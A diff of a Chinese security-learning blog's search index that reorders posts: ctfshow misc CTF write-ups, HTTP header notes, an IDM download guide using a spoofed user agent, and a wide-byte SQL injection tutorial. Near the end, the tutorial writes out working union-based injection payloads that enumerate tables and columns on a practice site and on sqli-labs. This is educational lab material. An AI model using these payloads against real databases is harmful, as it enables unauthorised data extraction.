@@ -67,48 +67,49 @@
       </categories>
   </entry>
   <entry>
-    <title>从0开始学web(一) http篇</title>
-    <url>/2021/04/29/http/</url>
-    <content><![CDATA[<p><font color=#999AAA >最近打算重新开始从头学web，简单记录一下</font></p>
-<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+    <title>ctfshow_misc入门  WP（未完）</title>
+    <url>/2021/05/11/ctfshow_misc_ru/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
 
 
-<p><img src="https://img-blog.csdnimg.cn/20210326090723497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
 
-<h1 id="关于CRLF"><a href="#关于CRLF" class="headerlink" title="关于CRLF"></a>关于CRLF</h1><p>CRLF是CR和LF两个字符的拼接，它们分别代表”回车+换行”（\r\n）“，全称为Carriage Return/Line Feed”，十六进制编码分别为0x0d和0x0a，URL编码为%0D和%0A。CR和LF组合在一起即CRLF命令，它表示键盘上的”Enter”键，许多应用程序和网络协议使用这些命令作为分隔符。</p>
-<p>有关CRLF注入攻击的相关知识随后再做记录</p>
-<p>crlf注入【<a href="https://baike.baidu.com/item/CRLF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/14696969?fr=aladdin">百度百科</a>】</p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>没啥好说的，打开图片就是flag</p>
+<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>附件是txt文本，用010editor打开，发现16进制对应的是png的文件头，修改后缀名misc2.txt–&gt;misc.png，打开图片就可以看到flag了</p>
+<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>解压后是一个bpg文件，在<a href="https://bellard.org/bpg/">网站</a>下载bpg文件查看器，解压后，用bpgview.exe打开misc3.bpg即可看见flag</p>
+<h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>给了6个txt文件，分别用010editor打开，看开头的16进制，找对应图片格式的文件头，依次改为png、jpg、bmp、gif、tif、webp之后将图片中的字符串拼接一下就可以得到flag了</p>
+<p>成品：<a href="https://pan.baidu.com/s/1Iz-HL2t5me3EfiZ2auGOFg">T0MR</a></p>
+<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>打开附件，图片上写着<code>there_is_no_flag_here</code><del>而且图片为900x150像素，很明显图片的高度被缩小了</del>（当我修改完高度之后发现，我错了）用010editor打开之后滑到最下边即可看到flag</p>
+<h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>用010editor打开搜索文本ctfshow，即可发现flag（这题是藏到中间了</p>
+<h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>题目上给了提示<code>flag在图片文件信息中</code> <del>好嘛</del>，还是在010editor中搜索文本就完事。。</p>
+<h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>题目给提示<code>flag在图片文件中图片文件中</code> 那就是个套娃呗，用010editor打开可以发现有两个png文件的文件头，把后边的png文件分离出来就可以了</p>
+<p>方法：找到第二个png文件头<code>89 50 4E 47</code> 将从这儿开始一直到结尾的16进制文本复制到一个新建文本文档里边，之后在010中点左上角  文件–&gt;导入16进制文本–&gt;选中刚才导出的文本–&gt;保存为png文件–&gt;即可看到flag（复制16进制文本方法：选中之后找左上角的编辑–&gt;复制–&gt;复制为16进制文本）</p>
+<h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><p>题目给的hint<code>flag在图片块里</code> 直接010打开，搜索一下ctfshow就行。</p>
+<p>预期解应该是👇</p>
+<p><img src="https://img.vim-cn.com/a1/c461bd18824075954430e81821aa105703e7fd.png" alt="misc9"></p>
+<h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><p>题目hint<code>flag在图片数据里</code> 用kali的binwalk分离出数据👇</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e misc10.png</span><br></pre></td></tr></table></figure>
 
-<h1 id="HTTP头"><a href="#HTTP头" class="headerlink" title="HTTP头"></a>HTTP头</h1><p>有关http的详细内容【<a href="https://www.runoob.com/http/http-tutorial.html">传送门</a>】<br><img src="https://img-blog.csdnimg.cn/20210327124144706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+<p>生成一个文件夹👇</p>
+<p><img src="https://img.vim-cn.com/32/0bb40622510cc79d4473bc01cc97ac033e36d5.png" alt="misc10"></p>
+<p>第一个文件打开就看到了flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于这题八神师傅说过：</span><br><span class="line">zlib是PNG IDAT块数据可选的压缩格式</span><br><span class="line">本题是师傅自己生成了一段zlib压缩数据，然后加上长度位、标识位和CRC校验位</span><br><span class="line">伪装成一个IDAT块，然后插入到图片文件里</span><br><span class="line">binwalk会找到zlib块的标记然后提取出来，同时因为这是个压缩数据，-e参数会自动把提取到的压缩包尝试进行解压，所以最后的提取结果里就有了原始的文本--&gt;flag</span><br></pre></td></tr></table></figure>
 
-<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p> HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<h2 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h2><p>X-Forwarded-For:<br>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。</p>
-<p>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，ip分别为 ip1、ip2、ip3，用户真实 ip 为 ip0，那么按照 XFF 标准，服务端最终会收到这样信息：X-Forwarded-For: ip0, ip1, ip2</p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
-<p>User-Agent通常格式：</p>
-<pre><code>Mozilla/5.0 (平台) 引擎版本 浏览器版本号
-</code></pre>
-<p><a href="http://www.mybatis.cn/archives/1238.html">User-Agent的伪造</a></p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。存储在你电脑上的cookies就好比一张身份凭证或者一把钥匙。</p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+<p>也可以解压最后一个idat块得到flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(zlib.decompress(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="string">b&#x27;ctfshow&#123;353252424ac69cb64f643768851ac790&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
 
-<h2 id="有关xff及referer伪造"><a href="#有关xff及referer伪造" class="headerlink" title="有关xff及referer伪造"></a>有关xff及referer伪造</h2><p>题目：攻防世界  xff_referer  【<a href="https://adworld.xctf.org.cn/">传送门</a>】<br><font color=#999AAA >WP在这里就不写了，有困难自行百度</font></p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
 
-<h1 id="http响应码"><a href="#http响应码" class="headerlink" title="http响应码"></a>http响应码</h1><p>详细内容【<a href="https://www.runoob.com/http/http-status-codes.html">传送门</a>】</p>
-]]></content>
+<h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p>hint<code>flag在另一张图里</code> </p>
+<p>讲真，这个hint没看懂，后来问了一下八神👴👴</p>
+<p><img src="https://img.vim-cn.com/be/0560324992ad5c0a89854edd473ba53de933ea.png" alt="misc11.1"></p>
+<p>用010打开👇</p>
+<p><img src="https://img.vim-cn.com/8b/c96dec54ddad4bcf6d656f5aae09205d16234e.png" alt="misc11.2"></p>
+<p>把第一个IDAT对应的部分删除之后保存为另一张图片即可看到flag</p>
+<p>或者用tweakpng打开选中第二个idat块，右键点击delete删除，然后另存为一张图片即可</p>
+<p><img src="https://img.vim-cn.com/af/4b6d14360e50ee54755174587a61af4a51a314.png" alt="misc11.3"></p>
+<h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3>]]></content>
       <categories>
-        <category>web学习</category>
+        <category>Misc</category>
       </categories>
   </entry>
   <entry>
@@ -368,32 +369,6 @@
       </categories>
   </entry>
   <entry>
-    <title>使用idm下载百度网盘文件</title>
-    <url>/2021/05/25/idm/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-
-
-<p>准备工作：idm、<a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
-<h1 id="一、配置IDM"><a href="#一、配置IDM" class="headerlink" title="一、配置IDM"></a>一、配置IDM</h1><p>打开客户端 点击右上角下载，在弹出的选项中找到最下边的<code>选项</code>转到配置界面</p>
-<p><img src="https://img.vim-cn.com/c5/fa6d5e4901cf31dd9313aeb236c7e832b7d049.png"></p>
-<p>点击下载，修改用户代理为👇</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdisk;P2SP;2.2.60.26</span><br></pre></td></tr></table></figure>
-
-<p>点击<code>确定</code>保存</p>
-<p>点击连接</p>
-<p><img src="https://img.vim-cn.com/89/8a4b17ee04e32945c5c0b5a199d039d111e6a6.png"></p>
-<p>点新建，在弹出的窗口中输入<code>*.baidupcs.com</code>，前缀切换为<code>https://</code>修改最大连接数为2</p>
-<p>点击<code>确定</code>保存</p>
-<h1 id="二、安装油猴脚本"><a href="#二、安装油猴脚本" class="headerlink" title="二、安装油猴脚本"></a>二、安装油猴脚本</h1><p><a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
-<h1 id="三、下载"><a href="#三、下载" class="headerlink" title="三、下载"></a>三、下载</h1><p><img src="https://img.vim-cn.com/90/8e9acd0ccc1faaefb29786432d994430a4baa9.png"></p>
-<p>发现多了一个按钮，点击选择api下载即可自动弹出idm窗口（记得先打开idm</p>
-]]></content>
-      <categories>
-        <category>工具使用</category>
-      </categories>
-  </entry>
-  <entry>
     <title>escapeshellarg逃逸与参数注入</title>
     <url>/2021/08/07/escapeshellarg/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
@@ -447,49 +422,108 @@
       </categories>
   </entry>
   <entry>
-    <title>ctfshow_misc入门  WP（未完）</title>
-    <url>/2021/05/11/ctfshow_misc_ru/</url>
+    <title>使用idm下载百度网盘文件</title>
+    <url>/2021/05/25/idm/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
 
 
 
-<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>没啥好说的，打开图片就是flag</p>
-<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>附件是txt文本，用010editor打开，发现16进制对应的是png的文件头，修改后缀名misc2.txt–&gt;misc.png，打开图片就可以看到flag了</p>
-<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>解压后是一个bpg文件，在<a href="https://bellard.org/bpg/">网站</a>下载bpg文件查看器，解压后，用bpgview.exe打开misc3.bpg即可看见flag</p>
-<h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>给了6个txt文件，分别用010editor打开，看开头的16进制，找对应图片格式的文件头，依次改为png、jpg、bmp、gif、tif、webp之后将图片中的字符串拼接一下就可以得到flag了</p>
-<p>成品：<a href="https://pan.baidu.com/s/1Iz-HL2t5me3EfiZ2auGOFg">T0MR</a></p>
-<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>打开附件，图片上写着<code>there_is_no_flag_here</code><del>而且图片为900x150像素，很明显图片的高度被缩小了</del>（当我修改完高度之后发现，我错了）用010editor打开之后滑到最下边即可看到flag</p>
-<h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>用010editor打开搜索文本ctfshow，即可发现flag（这题是藏到中间了</p>
-<h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>题目上给了提示<code>flag在图片文件信息中</code> <del>好嘛</del>，还是在010editor中搜索文本就完事。。</p>
-<h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>题目给提示<code>flag在图片文件中图片文件中</code> 那就是个套娃呗，用010editor打开可以发现有两个png文件的文件头，把后边的png文件分离出来就可以了</p>
-<p>方法：找到第二个png文件头<code>89 50 4E 47</code> 将从这儿开始一直到结尾的16进制文本复制到一个新建文本文档里边，之后在010中点左上角  文件–&gt;导入16进制文本–&gt;选中刚才导出的文本–&gt;保存为png文件–&gt;即可看到flag（复制16进制文本方法：选中之后找左上角的编辑–&gt;复制–&gt;复制为16进制文本）</p>
-<h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><p>题目给的hint<code>flag在图片块里</code> 直接010打开，搜索一下ctfshow就行。</p>
-<p>预期解应该是👇</p>
-<p><img src="https://img.vim-cn.com/a1/c461bd18824075954430e81821aa105703e7fd.png" alt="misc9"></p>
-<h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><p>题目hint<code>flag在图片数据里</code> 用kali的binwalk分离出数据👇</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e misc10.png</span><br></pre></td></tr></table></figure>
+<p>准备工作：idm、<a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
+<h1 id="一、配置IDM"><a href="#一、配置IDM" class="headerlink" title="一、配置IDM"></a>一、配置IDM</h1><p>打开客户端 点击右上角下载，在弹出的选项中找到最下边的<code>选项</code>转到配置界面</p>
+<p><img src="https://img.vim-cn.com/c5/fa6d5e4901cf31dd9313aeb236c7e832b7d049.png"></p>
+<p>点击下载，修改用户代理为👇</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdisk;P2SP;2.2.60.26</span><br></pre></td></tr></table></figure>
 
-<p>生成一个文件夹👇</p>
-<p><img src="https://img.vim-cn.com/32/0bb40622510cc79d4473bc01cc97ac033e36d5.png" alt="misc10"></p>
-<p>第一个文件打开就看到了flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于这题八神师傅说过：</span><br><span class="line">zlib是PNG IDAT块数据可选的压缩格式</span><br><span class="line">本题是师傅自己生成了一段zlib压缩数据，然后加上长度位、标识位和CRC校验位</span><br><span class="line">伪装成一个IDAT块，然后插入到图片文件里</span><br><span class="line">binwalk会找到zlib块的标记然后提取出来，同时因为这是个压缩数据，-e参数会自动把提取到的压缩包尝试进行解压，所以最后的提取结果里就有了原始的文本--&gt;flag</span><br></pre></td></tr></table></figure>
-
-<p>也可以解压最后一个idat块得到flag</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(zlib.decompress(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="string">b&#x27;ctfshow&#123;353252424ac69cb64f643768851ac790&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p>hint<code>flag在另一张图里</code> </p>
-<p>讲真，这个hint没看懂，后来问了一下八神👴👴</p>
-<p><img src="https://img.vim-cn.com/be/0560324992ad5c0a89854edd473ba53de933ea.png" alt="misc11.1"></p>
-<p>用010打开👇</p>
-<p><img src="https://img.vim-cn.com/8b/c96dec54ddad4bcf6d656f5aae09205d16234e.png" alt="misc11.2"></p>
-<p>把第一个IDAT对应的部分删除之后保存为另一张图片即可看到flag</p>
-<p>或者用tweakpng打开选中第二个idat块，右键点击delete删除，然后另存为一张图片即可</p>
-<p><img src="https://img.vim-cn.com/af/4b6d14360e50ee54755174587a61af4a51a314.png" alt="misc11.3"></p>
-<h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3>]]></content>
+<p>点击<code>确定</code>保存</p>
+<p>点击连接</p>
+<p><img src="https://img.vim-cn.com/89/8a4b17ee04e32945c5c0b5a199d039d111e6a6.png"></p>
+<p>点新建，在弹出的窗口中输入<code>*.baidupcs.com</code>，前缀切换为<code>https://</code>修改最大连接数为2</p>
+<p>点击<code>确定</code>保存</p>
+<h1 id="二、安装油猴脚本"><a href="#二、安装油猴脚本" class="headerlink" title="二、安装油猴脚本"></a>二、安装油猴脚本</h1><p><a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkey插件</a></p>
+<h1 id="三、下载"><a href="#三、下载" class="headerlink" title="三、下载"></a>三、下载</h1><p><img src="https://img.vim-cn.com/90/8e9acd0ccc1faaefb29786432d994430a4baa9.png"></p>
+<p>发现多了一个按钮，点击选择api下载即可自动弹出idm窗口（记得先打开idm</p>
+]]></content>
       <categories>
-        <category>Misc</category>
+        <category>工具使用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>从0开始学web(一) http篇</title>
+    <url>/2021/04/29/http/</url>
+    <content><![CDATA[<p><font color=#999AAA >最近打算重新开始从头学web，简单记录一下</font></p>
+<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+
+<p><img src="https://img-blog.csdnimg.cn/20210326090723497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h1 id="关于CRLF"><a href="#关于CRLF" class="headerlink" title="关于CRLF"></a>关于CRLF</h1><p>CRLF是CR和LF两个字符的拼接，它们分别代表”回车+换行”（\r\n）“，全称为Carriage Return/Line Feed”，十六进制编码分别为0x0d和0x0a，URL编码为%0D和%0A。CR和LF组合在一起即CRLF命令，它表示键盘上的”Enter”键，许多应用程序和网络协议使用这些命令作为分隔符。</p>
+<p>有关CRLF注入攻击的相关知识随后再做记录</p>
+<p>crlf注入【<a href="https://baike.baidu.com/item/CRLF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/14696969?fr=aladdin">百度百科</a>】</p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h1 id="HTTP头"><a href="#HTTP头" class="headerlink" title="HTTP头"></a>HTTP头</h1><p>有关http的详细内容【<a href="https://www.runoob.com/http/http-tutorial.html">传送门</a>】<br><img src="https://img-blog.csdnimg.cn/20210327124144706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p> HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h2 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h2><p>X-Forwarded-For:<br>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。</p>
+<p>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，ip分别为 ip1、ip2、ip3，用户真实 ip 为 ip0，那么按照 XFF 标准，服务端最终会收到这样信息：X-Forwarded-For: ip0, ip1, ip2</p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
+<p>User-Agent通常格式：</p>
+<pre><code>Mozilla/5.0 (平台) 引擎版本 浏览器版本号
+</code></pre>
+<p><a href="http://www.mybatis.cn/archives/1238.html">User-Agent的伪造</a></p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。存储在你电脑上的cookies就好比一张身份凭证或者一把钥匙。</p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+
+<h2 id="有关xff及referer伪造"><a href="#有关xff及referer伪造" class="headerlink" title="有关xff及referer伪造"></a>有关xff及referer伪造</h2><p>题目：攻防世界  xff_referer  【<a href="https://adworld.xctf.org.cn/">传送门</a>】<br><font color=#999AAA >WP在这里就不写了，有困难自行百度</font></p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h1 id="http响应码"><a href="#http响应码" class="headerlink" title="http响应码"></a>http响应码</h1><p>详细内容【<a href="https://www.runoob.com/http/http-status-codes.html">传送门</a>】</p>
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>宽字节注入</title>
+    <url>/2021/05/18/kuan/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+
+<h1 id="一、什么是宽字节注入？"><a href="#一、什么是宽字节注入？" class="headerlink" title="一、什么是宽字节注入？"></a>一、什么是宽字节注入？</h1><p><img src="https://img-blog.csdnimg.cn/20210113171352374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171400407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171412165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/">http://chinalover.sinaapp.com/SQL-GBK/</a></p>
+<p>sqli-labs 第32关(没有搭建的话可以去<a href="https://buuoj.cn/challenges#sqli-labs">buuctf找basic中的sqli-labs</a>)[这个可以配合理解，自行操作效果极佳]</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/20210113172133600.png" alt="在这里插入图片描述"><br>随便输个id<br><img src="https://img-blog.csdnimg.cn/20210113172209227.png" alt="在这里插入图片描述"><br>尝试用单引号闭合<br><img src="https://img-blog.csdnimg.cn/20210113172237782.png" alt="在这里插入图片描述"><br>发现‘ ‘ ’(单引号)转变成了‘ \‘ ’(反斜杠+单引号)<br>那就结合今天所学知识进行操作<br>首先利用order by 语句进行查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 1%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172707300.png" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/20210113172529680.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 2%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172651674.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172637974.png" alt="在这里插入图片描述"><br>3的话出现报错说明只有2个字段</p>
+<p>接着利用union select语句查询数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172929536.png" alt="在这里插入图片描述"><br>有了数据库名之后接着往下查</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173125851.png" alt="在这里插入图片描述"><br>接着查ctf4（其余几个有兴趣也可以查一下看看，给出ctf4是因为里边有flag）</p>
+<p>这里给ctf4转为了16进制（记得在前边加上0x）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x63746634%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173544299.png" alt="在这里插入图片描述"><br>看到了flag<br>继续查</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(flag)%20from ctf4%23</span><br></pre></td></tr></table></figure>
